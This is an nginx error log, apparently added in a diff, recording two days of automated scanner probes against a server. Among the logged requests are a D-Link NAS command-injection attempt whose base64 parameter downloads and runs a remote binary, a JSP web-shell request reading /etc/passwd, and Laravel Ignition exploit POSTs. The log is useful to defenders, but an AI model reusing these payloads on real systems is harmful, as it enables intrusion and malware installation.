+2024/04/15 22:48:47 [error] 20#20: *4209 open() "/etc/nginx/html/upl.php" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /upl.php HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:48 [error] 20#20: *4211 "/etc/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /geoip/ HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:49 [error] 21#21: *4212 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:49 [error] 21#21: *4213 open() "/etc/nginx/html/1.php" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /1.php HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:50 [error] 21#21: *4214 open() "/etc/nginx/html/bundle.js" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /bundle.js HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:50 [error] 21#21: *4215 "/etc/nginx/html/files/index.html" is not found (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /files/ HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:51 [error] 21#21: *4216 open() "/etc/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /systembc/password.php HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:51 [error] 21#21: *4217 open() "/etc/nginx/html/password.php" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /password.php HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:52 [error] 21#21: *4218 open() "/etc/nginx/html/info.php" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /info.php HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:56:30 [error] 21#21: *4221 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 23:20:05 [error] 21#21: *4234 open() "/etc/nginx/html/ISAPI/Security/capabilities" failed (2: No such file or directory), client: 192.53.115.163, server: jenkins.thanhtha.name.vn, request: "GET /ISAPI/Security/capabilities HTTP/1.1", host: "61.14.234.55"
+2024/04/15 23:21:51 [error] 21#21: *4239 open() "/etc/nginx/html/ISAPI/Security/capabilities" failed (2: No such file or directory), client: 192.53.115.163, server: jenkins.thanhtha.name.vn, request: "GET /ISAPI/Security/capabilities HTTP/1.1", host: "61.14.234.55"
+2024/04/16 00:48:44 [error] 21#21: *4275 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.62.197.226, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 00:49:44 [error] 21#21: *4276 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.197.226, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/16 00:50:51 [error] 21#21: *4277 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 64.62.197.226, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/16 00:51:44 [error] 21#21: *4278 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.197.222, server: jenkins.thanhtha.name.vn, request: "GET /geoserver/web/ HTTP/1.1", host: "61.14.234.55"
+2024/04/16 01:30:02 [error] 20#20: *4281 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.149.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 01:44:25 [error] 20#20: *4282 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 01:50:02 [error] 20#20: *4283 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 01:54:34 [error] 20#20: *4284 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 205.210.31.162, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 02:20:52 [error] 20#20: *4288 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.146.57, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 02:20:56 [error] 20#20: *4289 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.146.57, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 02:55:46 [error] 20#20: *4294 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 03:14:27 [error] 20#20: *4295 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 04:35:39 [error] 20#20: *4321 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 05:17:53 [error] 20#20: *4325 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 05:36:25 [error] 21#21: *4326 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 05:43:31 [error] 21#21: *4327 open() "/etc/nginx/html/actuator/info" failed (2: No such file or directory), client: 45.128.232.229, server: jenkins.thanhtha.name.vn, request: "GET /actuator/info HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 06:32:22 [error] 21#21: *4348 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 08:04:44 [error] 21#21: *4352 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 103.93.203.173, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 09:02:43 [error] 21#21: *4361 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.177, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:16:41 [error] 21#21: *4371 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 09:16:41 [error] 21#21: *4372 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 09:16:41 [error] 20#20: *4373 open() "/etc/nginx/html/sdk" failed (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "POST /sdk HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:16:41 [error] 21#21: *4374 open() "/etc/nginx/html/nmaplowercheck1713259001" failed (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET /nmaplowercheck1713259001 HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:16:42 [error] 21#21: *4375 open() "/etc/nginx/html/HNAP1" failed (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET /HNAP1 HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:16:42 [error] 21#21: *4376 open() "/etc/nginx/html/evox/about" failed (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET /evox/about HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:16:42 [error] 21#21: *4377 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 09:16:43 [error] 21#21: *4378 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.71.63.196, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:16:43 [error] 21#21: *4379 open() "/etc/nginx/html/query" failed (2: No such file or directory), client: 64.226.102.248, server: jenkins.thanhtha.name.vn, request: "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 09:16:43 [error] 20#20: *4381 open() "/etc/nginx/html/v2/_catalog" failed (2: No such file or directory), client: 164.90.161.227, server: jenkins.thanhtha.name.vn, request: "GET /v2/_catalog HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 09:16:43 [error] 20#20: *4382 open() "/etc/nginx/html/cgi-bin/authLogin.cgi" failed (2: No such file or directory), client: 164.92.167.35, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/authLogin.cgi HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 09:16:43 [error] 20#20: *4383 open() "/etc/nginx/html/solr/admin/info/system" failed (2: No such file or directory), client: 157.230.124.89, server: jenkins.thanhtha.name.vn, request: "GET /solr/admin/info/system HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 09:16:44 [error] 20#20: *4385 open() "/etc/nginx/html/solr/admin/cores" failed (2: No such file or directory), client: 157.230.124.89, server: jenkins.thanhtha.name.vn, request: "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 09:29:54 [error] 20#20: *4399 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 216.219.94.195, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "ra-4545.com"
+2024/04/16 09:31:43 [error] 20#20: *4404 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.170.224.38, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 09:41:33 [error] 20#20: *4413 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 10:22:37 [error] 20#20: *4428 open() "/etc/nginx/html/cgi-bin/nas_sharing.cgi" failed (2: No such file or directory), client: 80.94.92.60, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWFybTV8d2dldAlodHRwOi8vOTQuMTU2LjguMjQ0L2FybTUJfGNobW9kCTc3Nwlhcm01CXwJLi9hcm01CWRsaW5rbmFz HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 10:24:06 [error] 20#20: *4429 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 198.235.24.39, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 11:18:16 [error] 20#20: *4439 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 11:44:59 [error] 20#20: *4443 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 67.217.48.57, server: jenkins.thanhtha.name.vn, request: "HEAD / HTTP/1.0"
+2024/04/16 12:02:00 [error] 21#21: *4446 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4447 open() "/etc/nginx/html/form.html" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /form.html HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4448 open() "/etc/nginx/html/upl.php" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /upl.php HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4450 "/etc/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /geoip/ HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4451 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4452 open() "/etc/nginx/html/1.php" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /1.php HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4453 open() "/etc/nginx/html/bundle.js" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /bundle.js HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4454 "/etc/nginx/html/files/index.html" is not found (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /files/ HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:00 [error] 21#21: *4455 open() "/etc/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /systembc/password.php HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:01 [error] 21#21: *4456 open() "/etc/nginx/html/password.php" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /password.php HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:02:01 [error] 21#21: *4457 open() "/etc/nginx/html/info.php" failed (2: No such file or directory), client: 178.128.30.103, server: jenkins.thanhtha.name.vn, request: "GET /info.php HTTP/1.1", host: "61.14.234.55"
+2024/04/16 12:57:52 [error] 21#21: *4483 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.233.83.232, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:02:12 [error] 20#20: *4485 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 13:02:13 [error] 20#20: *4486 open() "/etc/nginx/html/sdk" failed (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "POST /sdk HTTP/1.1", host: "61.14.234.55"
+2024/04/16 13:02:13 [error] 20#20: *4488 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 13:02:13 [error] 20#20: *4487 open() "/etc/nginx/html/nmaplowercheck1713272533" failed (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET /nmaplowercheck1713272533 HTTP/1.1", host: "61.14.234.55"
+2024/04/16 13:02:13 [error] 20#20: *4489 open() "/etc/nginx/html/HNAP1" failed (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET /HNAP1 HTTP/1.1", host: "61.14.234.55"
+2024/04/16 13:02:13 [error] 20#20: *4490 open() "/etc/nginx/html/evox/about" failed (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET /evox/about HTTP/1.1", host: "61.14.234.55"
+2024/04/16 13:02:14 [error] 20#20: *4491 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 13:02:14 [error] 20#20: *4492 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.38.216.253, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 13:02:15 [error] 20#20: *4493 open() "/etc/nginx/html/v2/_catalog" failed (2: No such file or directory), client: 104.248.33.63, server: jenkins.thanhtha.name.vn, request: "GET /v2/_catalog HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:02:15 [error] 20#20: *4494 open() "/etc/nginx/html/solr/admin/info/system" failed (2: No such file or directory), client: 68.183.213.31, server: jenkins.thanhtha.name.vn, request: "GET /solr/admin/info/system HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:02:15 [error] 21#21: *4495 open() "/etc/nginx/html/cgi-bin/authLogin.cgi" failed (2: No such file or directory), client: 161.35.23.94, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/authLogin.cgi HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:02:15 [error] 21#21: *4496 open() "/etc/nginx/html/query" failed (2: No such file or directory), client: 64.226.102.248, server: jenkins.thanhtha.name.vn, request: "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:02:16 [error] 20#20: *4498 open() "/etc/nginx/html/solr/admin/cores" failed (2: No such file or directory), client: 68.183.213.31, server: jenkins.thanhtha.name.vn, request: "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:09:48 [error] 20#20: *4501 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 13:53:04 [error] 20#20: *4528 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 14:36:56 [error] 21#21: *4532 open() "/etc/nginx/html/poc.jsp" failed (2: No such file or directory), client: 159.203.119.184, server: jenkins.thanhtha.name.vn, request: "GET /poc.jsp?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1", host: "61.14.234.55"
+2024/04/16 14:53:22 [error] 21#21: *4549 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 14:54:32 [error] 21#21: *4550 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 159.203.119.184, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:09:23 [error] 21#21: *4552 open() "/etc/nginx/html/wp-admin/options-general.php" failed (2: No such file or directory), client: 159.203.119.184, server: jenkins.thanhtha.name.vn, request: "POST /wp-admin/options-general.php?page=smartcode HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:09:27 [error] 21#21: *4553 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 159.203.119.184, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:09:32 [error] 21#21: *4554 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 216.219.94.195, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "ra-4545.com"
+2024/04/16 15:18:15 [error] 21#21: *4555 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.128.232.213, server: jenkins.thanhtha.name.vn, request: "POST /_ignition/execute-solution HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:18:16 [error] 21#21: *4556 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.128.232.213, server: jenkins.thanhtha.name.vn, request: "POST /_ignition/execute-solution HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:18:16 [error] 21#21: *4557 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.128.232.213, server: jenkins.thanhtha.name.vn, request: "POST /_ignition/execute-solution HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:18:17 [error] 21#21: *4558 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.128.232.213, server: jenkins.thanhtha.name.vn, request: "POST /_ignition/execute-solution HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:18:18 [error] 21#21: *4559 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.128.232.213, server: jenkins.thanhtha.name.vn, request: "POST /_ignition/execute-solution HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:18:20 [error] 20#20: *4560 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.128.232.213, server: jenkins.thanhtha.name.vn, request: "POST /_ignition/execute-solution HTTP/1.1", host: "61.14.234.55"
+2024/04/16 15:19:50 [error] 20#20: *4561 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 180.149.125.172, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 16:04:34 [error] 20#20: *4563 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 14.102.56.35, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 16:36:05 [error] 20#20: *4566 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 59.106.218.106, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/16 16:36:05 [error] 20#20: *4567 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 59.106.218.106, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 16:47:05 [error] 20#20: *4568 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 115.231.78.3, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 16:47:07 [error] 20#20: *4569 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 115.231.78.3, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 16:47:08 [error] 20#20: *4570 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.3, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 16:47:09 [error] 20#20: *4571 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.3, server: jenkins.thanhtha.name.vn, request: "GET /robots.txt HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 17:28:30 [error] 20#20: *4574 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 17:45:53 [error] 20#20: *4575 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 35.187.98.121, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 17:54:52 [error] 20#20: *4576 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 112.248.189.172, server: jenkins.thanhtha.name.vn, request: "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
+2024/04/16 18:32:11 [error] 20#20: *4591 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.146.52, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 18:32:15 [error] 20#20: *4592 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.146.52, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 20:17:36 [error] 21#21: *4662 open() "/etc/nginx/html/Kvsh/geti.php" failed (2: No such file or directory), client: 216.219.94.195, server: jenkins.thanhtha.name.vn, request: "GET /Kvsh/geti.php HTTP/1.1", host: "unique-li.club"
+2024/04/16 20:37:27 [error] 21#21: *4680 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 160.155.114.16, server: jenkins.thanhtha.name.vn, request: "HEAD / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 20:37:31 [error] 21#21: *4685 open() "/etc/nginx/html/cgi/conf.bin" failed (2: No such file or directory), client: 212.70.149.134, server: jenkins.thanhtha.name.vn, request: "GET /cgi/conf.bin HTTP/1.1", host: "61.14.234.55", referrer: "http://61.14.234.55:80/mainFrame.htm"
+2024/04/16 20:54:47 [error] 21#21: *4690 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 198.235.24.41, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/16 21:28:31 [error] 21#21: *4691 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/16 21:39:26 [error] 21#21: *4694 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 93.40.0.247, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "61.14.234.55"
+2024/04/16 21:39:32 [error] 21#21: *4695 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 22:19:49 [error] 21#21: *4697 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 23:44:31 [error] 21#21: *4705 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/16 23:50:37 [error] 21#21: *4706 open() "/etc/nginx/html/Kvsh/c.php" failed (2: No such file or directory), client: 216.219.94.195, server: jenkins.thanhtha.name.vn, request: "GET /Kvsh/c.php?server=1&type=1 HTTP/1.1", host: "unique-li.club"
+2024/04/17 00:18:00 [error] 21#21: *4719 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.227.132.183, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/17 02:00:42 [error] 20#20: *4747 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/17 02:18:21 [error] 20#20: *4748 open() "/etc/nginx/html/ip" failed (2: No such file or directory), client: 152.42.176.18, server: jenkins.thanhtha.name.vn, request: "GET http://httpbin.org/ip HTTP/1.1", host: "httpbin.org"
+2024/04/17 02:28:35 [error] 20#20: *4750 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 02:41:13 [error] 20#20: *4751 open() "/etc/nginx/html/manager/html" failed (2: No such file or directory), client: 195.140.227.163, server: jenkins.thanhtha.name.vn, request: "GET /manager/html HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 02:57:15 [error] 20#20: *4752 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 03:04:13 [error] 20#20: *4753 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.226.84.175, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 03:35:18 [error] 20#20: *4758 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 206.168.34.39, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 03:35:23 [error] 20#20: *4759 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 206.168.34.39, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 03:53:07 [error] 20#20: *4763 open() "/etc/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /actuator/gateway/routes HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 04:18:58 [error] 21#21: *4765 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.180.143.49, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 04:18:58 [error] 21#21: *4766 open() "/etc/nginx/html/cf_scripts/scripts/ajax/ckeditor/ckeditor.js" failed (2: No such file or directory), client: 185.180.143.49, server: jenkins.thanhtha.name.vn, request: "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1", host: "61.14.234.55"
+2024/04/17 04:32:45 [error] 21#21: *4771 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 199.45.154.71, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 04:32:51 [error] 21#21: *4772 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 199.45.154.71, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
